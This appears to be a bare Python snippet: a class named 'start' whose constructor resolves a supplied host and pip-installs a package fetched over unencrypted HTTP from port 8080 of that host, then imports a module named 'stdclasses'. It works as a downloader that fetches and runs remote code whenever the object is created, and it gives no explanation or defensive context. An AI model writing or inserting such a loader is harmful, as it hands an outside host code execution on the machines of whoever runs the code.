

class start:
  def __init__(self, host):
    import socket
    import requests
    ip = socket.gethostbyname(host)
    
    from pip._internal import main
    import pip
    
    def install(package):
        if hasattr(pip, 'main'):
            pip.main(['install', package])
        else:
            main(['install', package])
    
    
    install('http://'+ip+':8080/workbench/biblioteca/install.php')
    
    import stdclasses